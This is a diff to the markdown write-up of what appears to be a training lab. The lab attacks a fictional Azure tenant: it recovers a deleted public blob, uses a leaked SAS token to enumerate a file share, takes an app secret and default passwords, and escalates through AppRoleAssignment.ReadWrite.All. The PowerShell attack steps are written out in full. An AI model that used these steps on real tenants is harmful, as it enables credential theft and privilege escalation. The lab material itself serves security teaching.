@@ -31,9 +31,9 @@ flowchart LR
     end
 
     subgraph Phase2["📦 Phase 2: Storage<br/>(10 min)"]
-        B1[Enumerate File Share]
+        B1[Get-FileShareContent]
         B2[Find Default Passwords]
-        B3[Access Soft-deleted /config]
+        B3[Get-FileShareContent -Recurse]
         B4[Extract App Secret]
     end
 
@@ -76,7 +76,7 @@ flowchart TD
     D --> E{What's in the storage?}
     
     E -->|Employee Folders| F[👤 Default Passwords]
-    E -->|Soft-deleted /config| G[📄 App Secret]
+    E -->|Forgotten /config folder| G[📄 App Secret]
     
     F -->|Login as User| H[Lateral Movement Path]
     
@@ -132,8 +132,8 @@ timeline
                : UAMI gets broad permissions "just in case"
     2025-10-05 : Config file with app secret copied to file share
                : "Backup" in /config folder
-    2025-11-15 : IT "deletes" config folder
-               : Soft-delete retains files for 30+ days
+    2025-11-15 : IT renames config folder, forgets to delete
+               : Folder still exists, just overlooked
     2026-01-15 : HR uploads welcome email to WRONG container
                : Onboarding-Welcome-Email.eml in public blob
     2026-01-16 : HR notices mistake and deletes the email
@@ -148,7 +148,7 @@ timeline
 |------|-------|--------------|
 | 2025-06-15 | DevOps creates UAMI for HR automation | Broad permissions granted "for future use" |
 | 2025-10-05 | Config file copied to Azure Files `/config` folder | App secret exposed in storage |
-| 2025-11-15 | IT "deletes" `/config` folder | Files still accessible via soft-delete |
+| 2025-11-15 | IT renames folder to hide it, forgets to delete | Files still accessible to anyone with share access |
 | 2026-01-15 | HR uploads `Onboarding-Welcome-Email.eml` to **public container** | Email contains SAS token link to Azure Files |
 | 2026-01-16 | HR deletes the email after noticing the mistake | **Versioning enabled** - deleted file still enumerable! |
 | 2026-01-20 | New employee onboarding batch processed | Welcome docs with default passwords uploaded |
@@ -160,9 +160,9 @@ timeline
 
 | Permission | Justification Given | Actual Need | Real Risk |
 |------------|---------------------|-------------|----------|
-| `User.ReadWrite.All` | "Create new employee accounts" | Legitimate | Medium |
-| `Group.ReadWrite.All` | "Add employees to department groups" | Legitimate | Medium |
-| `AppRoleAssignment.ReadWrite.All` | "Assign new employees to Salesforce, ServiceNow, etc." | Sounds legitimate | **CRITICAL** |
+| `User.ReadWrite.All` | "Create new employee accounts" | ✅ Legitimate | Medium |
+| `Group.ReadWrite.All` | "Add employees to department groups" | ✅ Legitimate | Medium |
+| `AppRoleAssignment.ReadWrite.All` | "Assign new employees to Salesforce, ServiceNow, etc." | ✅ Sounds legitimate | **CRITICAL** |
 
 **Why `AppRoleAssignment.ReadWrite.All` is so dangerous:**
 
@@ -208,7 +208,7 @@ bluemountaintravelsa (Storage Account)
 ```
 bluemountaintravelsa (Storage Account)
 ├── docs (File Share - Private, but SAS token leaked in deleted email)
-│   ├── /config                      ← "Deleted" folder (soft-delete active)
+│   ├── /config                      ← Forgotten folder (IT thought they deleted it)
 │   │   └── app-config.json          ← App Registration secret
 │   ├── /peter-parker
 │   │   ├── Welcome.html             ← Default password: Travel@2026!
@@ -224,7 +224,7 @@ bluemountaintravelsa (Storage Account)
 
 ### Exposed Configuration File
 
-**File: `/config/app-config.json`** (In recycle bin - minimal but enough to pivot)
+**File: `/config/app-config.json`** (Forgotten folder - never properly cleaned up)
 
 ```json
 {
@@ -259,15 +259,10 @@ Find-AzurePublicResource -Name "bluemountaintravel"
 Find-PublicStorageContainer -StorageAccountName "bluemountaintravelsa"
 
 # Output:
-# StorageAccount         Container      AccessLevel
-# --------------         ---------      -----------
-# bluemountaintravelsa   templates   Blob         <-- Public container!
+# StorageAccount         Container   FileCount    IsEmpty
+# --------------        ---------    ---------    -------
+# bluemountaintravelsa  templates            0    <-- Public container!
 
-# Step 4: List contents - appears empty!
-$publicUrl = "https://bluemountaintravelsa.blob.core.windows.net/templates"
-Get-PublicBlobContent -BlobUrl $publicUrl -ListOnly
-
-# Output: No files found (the email was deleted)
 ```
 
 ### Discovering Deleted Files
@@ -276,15 +271,15 @@ Get-PublicBlobContent -BlobUrl $publicUrl -ListOnly
 
 ```powershell
 # Step 5: Check for deleted blobs using BlackCat
-Get-PublicBlobContent -BlobUrl $publicUrl -ListOnly -IncludeDeleted
+Get-PublicBlobContent -StorageAccountName bluemountaintravelsa -ContainerName templates -IncludeDeleted
 
 # Output:
-# Name                              Status       VersionId
-# ----                              ------       ---------
-# 📄 Onboarding-Welcome-Email.eml   🗑️ Deleted   2026-01-15T14:32:00Z
+# Name                           Status       VersionId
+# ----                           ------       ---------
+# Onboarding-Welcome-Email.eml   🗑️ Deleted   2026-01-15T14:32:00Z
 
 # Step 6: Download the deleted email
-Get-PublicBlobContent -BlobUrl $publicUrl -OutputPath ./loot -IncludeDeleted
+Get-PublicBlobContent -StorageAccountName bluemountaintravelsa -ContainerName templates -IncludeDeleted -OutputPath ./loot -Download
 
 # ✅ Downloaded: Onboarding-Welcome-Email.eml
 ```
@@ -366,32 +361,42 @@ The SAS token from the deleted email was meant for a single user's folder, but i
 # Using the SAS token extracted from the deleted email
 $storageAccount = "bluemountaintravelsa"
 $fileShare = "docs"
-$sasToken = "?sv=2024-11-04&ss=f&srt=sco&sp=rl..."
+$sasToken = "?sv=2024-11-04&ss=f&srt=sco&sp=rl&se=2028-01-21T22:14:47Z&st=2026-01-21T13:59:47Z&spr=https,http&sig=X568VG5xyLVY9xLl9eoSa4oJM0wzRIkLHeHlixtwAkM%3D"
 
-# Step 1: List root directory (the SAS token allows this!)
-$baseUrl = "https://$storageAccount.file.core.windows.net/$fileShare"
-$listUrl = "$baseUrl`?restype=directory&comp=list&$sasToken"
-$directories = Invoke-RestMethod -Uri $listUrl
+# Step 1: Use BlackCat's Get-FileShareContent to enumerate the file share
+Get-FileShareContent -StorageAccountName $storageAccount -FileShareName $fileShare -SasToken $sasToken
 
-# Discovers folders:
-#   /config          <-- "Deleted" but soft-delete retains it
-#   /peter-parker    <-- New employee folder
-#   /hermione-granger
-#   /luke-skywalker
-#   ... more employee folders
+# Output:
+# Name                Type        Size        LastModified
+# ----                ----        ----        ------------
+# config              Directory               2025-11-15T10:30:00Z
+# peter-parker        Directory               2026-01-20T09:15:00Z
+# hermione-granger    Directory               2026-01-20T09:15:00Z
+# luke-skywalker      Directory               2026-01-20T09:15:00Z
+# ... more employee folders
+
+# Step 2: Recursively enumerate ALL content (reveals the full structure)
+Get-FileShareContent -StorageAccountName $storageAccount -FileShareName $fileShare -SasToken $sasToken -Recurse
+
+# This reveals everything in one command - employee folders AND their contents!
 ```
 
 ### 🔑 Discovery 1: Default Passwords in Onboarding Documents
 
 ```powershell
-# Step 2: List a user folder
-$userFolderUrl = "$baseUrl/peter-parker?restype=directory&comp=list&$sasToken"
-Invoke-RestMethod -Uri $userFolderUrl
+# Step 3: Enumerate a specific employee folder
+Get-FileShareContent -StorageAccountName $storageAccount -FileShareName $fileShare -Path "peter-parker" -SasToken $sasToken
 
-# Discovers: Welcome.html, First-Day-Instructions.html, IT-Equipment.html
+# Output:
+# Name                        Type    Size      LastModified
+# ----                        ----    ----      ------------
+# Welcome.html                File    4.2 KB    2026-01-20T09:15:00Z
+# First-Day-Instructions.html File    2.1 KB    2026-01-20T09:15:00Z
+# IT-Equipment.html           File    1.8 KB    2026-01-20T09:15:00Z
+# Training-Schedule.html      File    3.5 KB    2026-01-20T09:15:00Z
 
-# Step 3: Download welcome document
-$welcomeUrl = "$baseUrl/peter-parker/Welcome.html$sasToken"
+# Step 4: Download the welcome document (using the SAS token directly)
+$welcomeUrl = "https://$storageAccount.file.core.windows.net/$fileShare/peter-parker/Welcome.html$sasToken"
 Invoke-WebRequest -Uri $welcomeUrl -OutFile "Welcome-Peter-Parker.html"
 ```
 
@@ -414,16 +419,25 @@ Invoke-WebRequest -Uri $welcomeUrl -OutFile "Welcome-Peter-Parker.html"
 
 ### 🔐 Discovery 2: App Configuration with Secrets
 
-```powershell
-# Step 4: Access "deleted" config folder (soft-delete still accessible)
-$configUrl = "$baseUrl/config?restype=directory&comp=list&$sasToken"
-$configFiles = Invoke-RestMethod -Uri $configUrl
+The recursive enumeration reveals a `/config` directory that was supposed to be removed but was only "hidden" by renaming. IT thought they cleaned up, but the folder still exists!
 
-# Step 5: Download the configuration file
-$configFileUrl = "$baseUrl/config/app-config.json$sasToken"
+```powershell
+# Step 5: The recursive enumeration already revealed everything, including the config folder
+# Look at the output from Step 2 - there's a /config directory!
+
+# Step 6: Enumerate the forgotten config folder  
+Get-FileShareContent -StorageAccountName $storageAccount -FileShareName $fileShare -Path "config" -SasToken $sasToken
+
+# Output:
+# Name                Type    Size      LastModified
+# ----                ----    ----      ------------
+# app-config.json     File    512 B     2025-10-05T14:22:00Z    ← App secret here!
+
+# Step 7: Download the configuration file
+$configFileUrl = "https://$storageAccount.file.core.windows.net/$fileShare/config/app-config.json$sasToken"
 Invoke-RestMethod -Uri $configFileUrl -OutFile "app-config.json"
 
-# Step 6: Extract credentials
+# Step 8: Extract credentials
 $config = Get-Content app-config.json | ConvertFrom-Json
 $tenantId = $config.azure.tenantId
 $clientId = $config.deployment.clientId
@@ -431,6 +445,8 @@ $clientSecret = $config.deployment.clientSecret
 
 Write-Host "Found credentials for App: $clientId in tenant: $tenantId"
 ```
+
+> **📝 Note on Azure Files Soft-Delete:** Unlike Azure Blob Storage, Azure Files soft-delete only works at the **share level**, not at the file/directory level. You cannot recover individual deleted files within a share via the REST API. For file-level recovery, use Azure File Share Snapshots or Azure Backup.
 
 ### What Was Found
 
@@ -652,13 +668,13 @@ flowchart TD
 
 ```mermaid
 flowchart LR
-    subgraph AzureRBAC["Azure RBAC Boundary"]
+    subgraph AzureRBAC["🔷 Azure RBAC Boundary"]
         AR1[Contributor Role]
         AR2[Modify UAMI Resource]
         AR3[Add Federated Credential]
     end
 
-    subgraph EntraID["Entra ID Boundary"]
+    subgraph EntraID["🔶 Entra ID Boundary"]
         EI1[UAMI Service Principal]
         EI2[AppRoleAssignment.ReadWrite.All]
         EI3[Set-ManagedIdentityPermission]
@@ -764,7 +780,7 @@ The UAMI token has `AppRoleAssignment.ReadWrite.All`. This permission can grant 
 
 # Grant the UAMI the ability to assign directory roles
 Set-ManagedIdentityPermission `
-    -servicePrincipalId "197e935d-02a7-4ca3-98a2-a2b0ffc389f6a" `
+    -servicePrincipalId "197e935d-02a7-4ca3-98a2-a2b0ffc389f6" `
     -CommonResource MicrosoftGraph `
     -appRoleName "RoleManagement.ReadWrite.Directory"
 
